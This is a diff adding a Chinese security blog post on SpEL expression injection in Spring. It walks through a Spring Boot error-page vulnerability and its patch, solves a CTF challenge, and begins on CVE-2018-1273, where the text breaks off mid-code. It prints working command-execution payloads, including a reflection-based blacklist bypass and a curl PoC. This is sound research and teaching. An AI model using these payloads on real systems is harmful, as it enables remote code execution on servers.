@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          SPEL表达式注入-入门篇 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2019/05/SPEL表达式注入-入门篇/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                    </div>
+                    <h1>SPEL表达式注入-入门篇</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2019-05-09
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="SPEL表达式"><a href="#SPEL表达式" class="headerlink" title="SPEL表达式"></a>SPEL表达式</h1><blockquote>
+<p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p>
+</blockquote>
+<p>个人理解就是Spring框架中的一种语言表达式，类似于Struts2中的OGNL的东西。</p>
+<p>一个最基础的触发例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/spel"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">spel</span><span class="params">(String input)</span></span>&#123;</span><br><span class="line">    SpelExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    Expression expression = parser.parseExpression(input);</span><br><span class="line">    <span class="keyword">return</span> expression.getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接将用户的输入当作表达式内容进行解析。</p>
+<p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/1.png" alt></p>
+<p>执行下系统命令</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/spel?input=<span class="keyword">new</span> <span class="type">java</span>.lang.ProcessBuilder(<span class="string">"calc"</span>).start()</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/2.png" alt></p>
+<h1 id="Spring-Boot-SPEL表达式注入"><a href="#Spring-Boot-SPEL表达式注入" class="headerlink" title="Spring Boot  SPEL表达式注入"></a>Spring Boot  SPEL表达式注入</h1><p>算是一个比较早期的漏洞，影响的版本有</p>
+<ul>
+<li>1.1.0-1.1.12</li>
+<li>1.2.0-1.2.7</li>
+<li>1.3.0</li>
+</ul>
+<p>这里测试使用的是<code>1.2.0</code>的版本</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>漏洞触发的条件是在错误页面中输出用户可控的值，如下是一个简单的demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(String payload)</span></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接将用户的输入抛出了个异常，访问之后就是一个Spring Boot熟悉的错误页面</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/3.png" alt></p>
+<p>并可以看到将<code>payload</code>的值输出到了页面中，但输入一个SPEL表达式<code>${xxx}</code>时，却会返回解析之后的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/4.png" alt></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>找到生成错误页面的代码断</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring-boot-autoconfigure-<span class="number">1.2</span>.<span class="number">0</span>.RELEASE.jar!<span class="regexp">/org/springframework</span><span class="regexp">/boot/autoconfigure</span><span class="regexp">/web/</span>ErrorMvcAutoConfiguration<span class="class">.<span class="keyword">class</span>:101</span></span><br></pre></td></tr></table></figure>
+<p>在SpelView的render方法中打下断点</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/5.png" alt></p>
+<p>可以看到是在<code>this.helper.replacePlaceholders(this.template, this.resolver)</code>中生成了错误页面，然后返回给result</p>
+<p><code>template</code>就是错误页面的模板，其中也包含着几个SPEL表达式变量</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Whitelabel Error Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>This application has no explicit mapping for /error, so you are seeing this as a fallback.<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'created'</span>&gt;</span>$&#123;timestamp&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在变量<code>map</code>里已经获取到了这几个变量的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/6.png" alt></p>
+<p>跟进<code>replacePlaceholders</code>函数之后可以来到<code>PropertyPlaceholderHelper.class:59</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/7.png" alt></p>
+<p>while循环中循环解析<code>${xxx}</code>的表达式，例如第一个解析到<code>${timestamp}</code>，取出中间的值，然后通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String propVal = placeholderResolver.resolvePlaceholder(placeholder);</span><br></pre></td></tr></table></figure>
+<p>跟进去看一下具体的处理方法</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/8.png" alt></p>
+<p>可以看到这里将表达式中间的值带入了SPEL表达式进行解析，然后返回了对应的值（返回前还进行了一次html编码，防止XSS</p>
+<p>让我们来跟一下处理<code>${message}</code>时的处理方式</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/9.png" alt></p>
+<p>可以看到在取到<code>${message}</code>的值<code>propVal</code>之后，由于其不等于null，于是又递归进行了一次<code>parseStringValue</code></p>
+<p>由于此时的<code>propVal</code>值为<code>${2*2}</code>就会和之前的解析表达式流程一样再进行一次SPEL表达式解析。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/10.png" alt></p>
+<p>可以看到此时将<code>${2*2}</code>解析成了4，然后返回在了页面中，从而触发了漏洞。</p>
+<p>由于这里SPEL返回值时进行了一次html编码，所以导致取出的<code>${message}</code>值时会进行一次转义，因此之前的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="string">"calc"</span>).start()&#125;</span><br></pre></td></tr></table></figure>
+<p>需要进行一些小小的改动</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/11.png" alt></p>
+<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></p>
+<p>新增了一个<code>NonRecursivePropertyPlaceholderHelper</code>类用以防止递归</p>
+<p>测试环境为1.3.1</p>
+<p>可以看到<code>SpelView</code>中的<code>helper</code>变成了<code>NonRecursivePropertyPlaceholderHelper</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> NonRecursivePropertyPlaceholderHelper helper = <span class="keyword">new</span> NonRecursivePropertyPlaceholderHelper(<span class="string">"$&#123;"</span>, <span class="string">"&#125;"</span>);</span><br></pre></td></tr></table></figure>
+<p>当第一次解析的时候，可以看到</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/12.png" alt></p>
+<p>此时<code>placeholderResolver</code>的<code>resolver</code>是一个<code>ExpressionResolver</code>类型</p>
+<p>但是当递归解析时</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/13.png" alt></p>
+<p>就被嵌套了一层，从而变成了<code>NonRecursivePropertyPlaceholderResolver</code></p>
+<p>然后再每次解析表达式前，也增加了个判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String placeholderName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.resolver <span class="keyword">instanceof</span> NonRecursivePropertyPlaceholderHelper.NonRecursivePlaceholderResolver ? <span class="keyword">null</span> : <span class="keyword">this</span>.resolver.resolvePlaceholder(placeholderName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果是<code>NonRecursivePlaceholderResolver</code>类型就直接返回null，从而停止递归解析。</p>
+<h1 id="Code-Breaking-javacon"><a href="#Code-Breaking-javacon" class="headerlink" title="Code-Breaking javacon"></a>Code-Breaking javacon</h1><p>上学期p神的一道代码审计题，由于根本不会java那时候就空着了。如今回过头来发现也是一道SPEL注入题，感觉难度其实比其他PHP的要简单不少，但是耐不住Java的入门门槛稍高。</p>
+<p>题目逻辑就不梳理了，看一下代码应该就能看懂，直接来看存在漏洞的部分。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String rememberMeValue,</span></span><br><span class="line"><span class="function">                    HttpSession session,</span></span><br><span class="line"><span class="function">                    Model model) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        String username = userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">    <span class="keyword">if</span>(username == <span class="keyword">null</span> || username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    model.addAttribute(<span class="string">"name"</span>, getAdvanceValue(username.toString()));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点在<code>getAdvanceValue(username.toString())</code>中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String keyword: keyworkProperties.getBlacklist()) &#123;</span><br><span class="line">        Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">    Expression exp = parser.parseExpression(val, parserContext);</span><br><span class="line">    SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">    <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里进行了明显的SPEL表达式的解析。但是在解析之前会进行黑名单的校验</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">keywords:</span></span><br><span class="line">  <span class="attr">blacklist:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">java.+lang</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Runtime</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">exec.*\(</span></span><br></pre></td></tr></table></figure>
+<p>在控制器中可以看到，其实表达式的值<code>username</code>是可以通过Cookie中的<code>remember-me</code>来控制的，但是经过了一点加密。</p>
+<p>但由于是白盒，这层加密也可以直接看到加密算法。这样我们就可以控制SPEL中传入的值了</p>
+<blockquote>
+<p> 提一句，一开始我以为页面中返回的值是<code>model.addAttribute</code>中的<code>name</code>，后来看了下html页面中发现只是打印了<code>${session.username}</code></p>
+<p>这里为了方便调试，将<code>name</code>的值也打印了出来</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;article&gt;</span><br><span class="line">&gt;     &lt;h2 th:text="'Hello, ' + $&#123;session.username&#125;"&gt;&lt;/h2&gt;</span><br><span class="line">&gt;     &lt;p&gt;This is admin panel.&lt;/p&gt;</span><br><span class="line">&gt;     &lt;p th:text="'name: ' + $&#123;name&#125;"&gt;&lt;/p&gt;</span><br><span class="line">&gt; &lt;/article&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>加密的算法也在<code>Encryptor.java</code>中，我们可以通过这个来生成对应的密文</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    String rememberMeKey = <span class="string">"c0dehack1nghere1"</span>;</span><br><span class="line">    String encryptd = Encryptor.encrypt(rememberMeKey, <span class="string">"0123456789abcdef"</span>, <span class="string">"#&#123;2*2&#125;"</span>);</span><br><span class="line">    System.out.println(encryptd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/14.png" alt></p>
+<p>可以看到<code>name</code>的值确实就是传入的SPEL表达式解析之后的值</p>
+<blockquote>
+<p>说一个自己遇到的小疑惑，之前Springboot的例子中SPEL表达式的标识符是<code>${}</code>这个可以从代码中看到是匹配了，<code>${</code>和<code>}</code>标识的，那为什么这里的标识符是<code>#{}</code></p>
+<p>我们可以来到解析SPEL表达式的地方，发现这里其实是多了一些东西的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">&gt; Expression exp = parser.parseExpression(val, parserContext);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>这里在解析表达式的时候传入了第二个参数<code>parseContext</code>，这是个<code>ParserContext</code>类的参数，里面就定义了SPEL表达式的标识符。这也就是这里标识符用<code>#{}</code>的原因了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/15.png" alt></p>
+</blockquote>
+<p>继续回到题解上，由于有黑名单的限制，所以之前命令执行的payload传入时会被检测到，这里来看下别的师傅的payload。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'calc')&#125;</span><br></pre></td></tr></table></figure>
+<p>好吧，是有点长，看起来有点晕。从<code>getClass</code>、<code>forName</code>、<code>getMethod</code>、<code>invoke</code>这些函数可以看出是用了反射的机制。</p>
+<p>我们可以一步一步来分析下这个payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.getClass()</span><br><span class="line"><span class="comment">// class java.lang.String</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>)</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'ex'</span>+<span class="string">'ec'</span>,<span class="string">''</span>.getClass())</span><br><span class="line"><span class="comment">// public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'getRu'</span>+<span class="string">'ntime'</span>)</span><br><span class="line"><span class="comment">// public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'getRu'</span>+<span class="string">'ntime'</span>).invoke(<span class="keyword">null</span>)</span><br><span class="line"><span class="comment">// java.lang.Runtime@c2939a</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'ex'</span>+<span class="string">'ec'</span>,<span class="string">''</span>.getClass()).invoke(<span class="string">''</span>.getClass().forName(<span class="string">'java.la'</span>+<span class="string">'ng.Ru'</span>+<span class="string">'ntime'</span>).getMethod(<span class="string">'getRu'</span>+<span class="string">'ntime'</span>).invoke(<span class="keyword">null</span>),<span class="string">'calc'</span>)</span><br><span class="line"><span class="comment">// java.lang.ProcessImpl@f2f85c</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，其实整个payload就是在凑<code>invoke</code>需要的参数，通过<code>forName</code>和<code>getMethod</code>来获取<code>Runtime.exec</code>的函数和类。</p>
+<p>这样就可以将<code>java.lang.Runtime</code>和<code>.exec</code>用字符串拼接的方式进行黑名单的绕过。最后命令执行。</p>
+<p>这里就弹个计算器以表尊敬</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/16.png" alt></p>
+<h1 id="CVE-2018-1273-RCE-with-Spring-Data-Commons"><a href="#CVE-2018-1273-RCE-with-Spring-Data-Commons" class="headerlink" title="CVE-2018-1273: RCE with Spring Data Commons"></a>CVE-2018-1273: RCE with Spring Data Commons</h1><p>漏洞环境参考的 <a href="https://github.com/wearearima/poc-cve-2018-1273" target="_blank" rel="noopener">https://github.com/wearearima/poc-cve-2018-1273</a></p>
+<p>漏洞POC为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8080/account -d <span class="string">"name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123"</span></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发点为<code>spring-data-commons-1.13.10.RELEASE-sources.jar!/org/springframework/data/web/MapDataBinder.java:158</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/17.png" alt></p>
+<p>可以看到是一个很明显的SPEL表达式的注入。</p>
+<p>查看调用栈可以发现，此处应该是一个<code>Data Commons</code>自动化绑定传入参数的操作。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/18.png" alt></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">createAttribute</span><span class="params">(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    MapDataBinder binder = <span class="keyword">new</span> MapDataBinder(parameter.getParameterType(), conversionService.getObject());</span><br><span class="line">    binder.bind(<span class="keyword">new</span> MutablePropertyValues(request.getParameterMap()));</span><br><span class="line"></span><br><span class="line">    <span 